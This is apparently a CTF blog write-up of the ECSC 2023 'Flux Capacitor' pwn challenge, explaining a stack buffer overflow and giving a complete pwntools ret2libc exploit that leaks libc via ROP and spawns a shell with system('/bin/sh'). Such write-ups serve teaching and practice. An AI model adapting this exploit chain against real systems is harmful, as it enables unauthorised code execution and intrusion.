---
id: 16
title: "ECSC 2023: Flux Capacitor"
subtitle: "ECSC 2023 Day 1: Pwn"
date: "2023.11.02"
tags: "ecsc, ecsc2023, c, pwn, ctf, ctf blog, writeup"
---

## Foreword

This challenge was released near the end of Day 1 yet it's a much easier pwn challenge than all the other challenges. It is just a straight forward buffer overflow ret2libc challenge.

# Flux Capacitor

We run `checksec` on the binary:
```bash
[*] '/mnt/e/ctf_archive/ecsc2023/d1/flux_capacitor/flux_capacitor'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

It has Full RELRO and NX enabled, but no canary or PIE.

We open the binary up in IDA to see that it's as straight-forward as it gets.
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  setup(argc, argv, envp);
  write(1, "\nFlux capacitor: \n", 0x13uLL);
  write(1, " __         __\n", 0x10uLL);
  write(1, "(__)       (__)\n", 0x11uLL);
  write(1, " \\ \\       / /\n", 0x10uLL);
  write(1, "  \\ \\     / /\n", 0xFuLL);
  write(1, "   \\ \\   / /\n", 0xEuLL);
  write(1, "    \\ \\ / /\n", 0xDuLL);
  write(1, "     \\   /\n", 0xCuLL);
  write(1, "      \\ /\n", 0xBuLL);
  write(1, "      | |\n", 0xBuLL);
  write(1, "      | |\n", 0xBuLL);
  write(1, "      | |\n", 0xBuLL);
  write(1, "      |_|\n", 0xBuLL);
  write(1, "      (_)\n", 0xBuLL);
  write(1, "\n\n[*] Year: [1955]", 0x13uLL);
  write(1, "\n[*] Plutonium ", 0x10uLL);
  write(1, "is not available ", 0x12uLL);
  write(1, "to everoyne.\n", 0xEuLL);
  write(1, "\n[Doc]  : We need ", 0x13uLL);
  write(1, "to find a way to", 0x11uLL);
  write(1, " fill the Flux ", 0x10uLL);
  write(1, "Capacitor with ", 0x10uLL);
  write(1, "energy. Any ideas", 0x12uLL);
  write(1, " Marty?\n[Marty]: ", 0x12uLL);
  read(0, buf, 0x100uLL);
  write(1, "\n[Doc]  : This ", 0x10uLL);
  write(1, "will not work..\n\n", 0x12uLL);
  return 0;
}
```

Yep, that's the whole binary.

We can see that `char buf[32]` is declared with size 32 but `read(0, buf, 0x100uLL);` reads `0x100` bytes into `buf`.

Since this challenge is Full RELRO and NX enabled, we cannot directly execute shellcode nor overwrite GOT, hence we will do ret2libc.

Leak `write` address and return to main, calculate libc base, then perform ROP chain to pop shell.
```py
from pwn import *
from exploit import *

# set exploit source, context binary, context log_level, libc
elf = context.binary = ELF("../sols/ezpwn/flux_capacitor_patched", checksec=False)
# context.log_level = 'debug'
libc = ELF("./libc.so.6")

# Run binary 1st time
p = exploit_source("../sols/ezpwn/flux_capacitor_patched", "localhost")

rop = ROP(elf)

# find and pop write, then go back to main
rop.write(1, elf.got['write'])
rop.main()

payload = flat({0x20: p64(0) + rop.chain()})

p.sendlineafter(b"[Marty]:", payload)

# grab output, calculate libc base
p.recvuntil(b"will not work..\n\n\0")

leak = u64(p.recvn(8))
offset = libc.sym.write
libc.address = leak  - offset
info(f"{hex(leak) =}")
info(f"{hex(offset) =}")
success(f"{hex(libc.address) =}")

pause()

# find /bin/sh and call system
rop1 = ROP(libc)

rop1.system(next(libc.search(b"/bin/sh")))
p.sendlineafter(":", flat({ 0x20: p64(0) + rop1.chain() }))

p.interactive()
```

`cat flag.txt` for the flag.